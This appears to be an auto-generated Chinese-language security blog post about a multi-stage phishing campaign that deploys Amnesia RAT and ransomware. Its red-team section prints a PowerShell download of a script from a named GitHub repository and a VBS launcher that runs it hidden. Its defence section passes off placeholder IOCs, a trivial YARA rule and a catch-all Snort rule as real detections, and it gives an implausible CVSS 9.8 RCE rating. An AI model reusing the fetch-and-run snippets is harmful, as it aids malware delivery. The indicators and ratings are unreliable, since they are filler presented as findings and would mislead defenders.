---
layout: post
title:  "Multi-Stage Phishing Campaign Targets Russia with Amnesia RAT and Ransomware"
date:   2026-01-24 12:28:34 +0000
categories: [security]
severity: critical
---

# 🚨 解析多階段釣魚攻擊：利用 Amnesia RAT 和 Ransomware 進行全方位威脅
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 LPE (Local Privilege Escalation)
> * **關鍵技術**: Social Engineering, PowerShell, Visual Basic Script, Defendnot, Amnesia RAT, Ransomware

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用社會工程學技巧，通過電子郵件或其他方式將惡意文件發送給受害者，從而實現初始感染。
* **攻擊流程圖解**:
  1. 受害者打開電子郵件附件或下載惡意文件。
  2. 惡意文件執行，啟動 PowerShell 腳本。
  3. PowerShell 腳本下載並執行 Visual Basic Script。
  4. Visual Basic Script 作為控制器，組裝和執行下一階段的 payload。
* **受影響元件**: Windows 10、Windows Server 2019 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要有管理員權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # PowerShell 腳本示例
      $url = "https://github.com/Mafin111/MafinREP111"
      $script = Invoke-WebRequest -Uri $url
      $script | Out-File -FilePath "C:\temp\script.ps1"
    
    ```
 

```

vbs
  ' Visual Basic Script 示例
  Dim objShell
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "C:\temp\script.ps1", 0, True

```
* **繞過技術**: 攻擊者使用 Defendnot 來禁用 Microsoft Defender，從而繞過安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\temp\script.ps1 |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Amnesia_RAT {
        meta:
          description = "Amnesia RAT Malware"
          author = "Your Name"
        strings:
          $a = "Amnesia RAT" ascii
        condition:
          $a
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"Amnesia RAT C2 Communication"; content:"|00 00 00 01|"; sid:1000001;)

```
* **緩解措施**: 啟用 Tamper Protection，監控 Defender 設定變化，更新系統和軟件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Social Engineering (社會工程學)**: 想像一個攻擊者通過電話或電子郵件說服你提供敏感信息。技術上是指攻擊者使用心理操縱和欺騙手段來實現攻擊。
* **PowerShell (powershell)**: 一種由 Microsoft 開發的任務自動化和配置管理框架。
* **Defendnot (defendnot)**: 一種工具，用于禁用 Microsoft Defender。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/multi-stage-phishing-campaign-targets.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


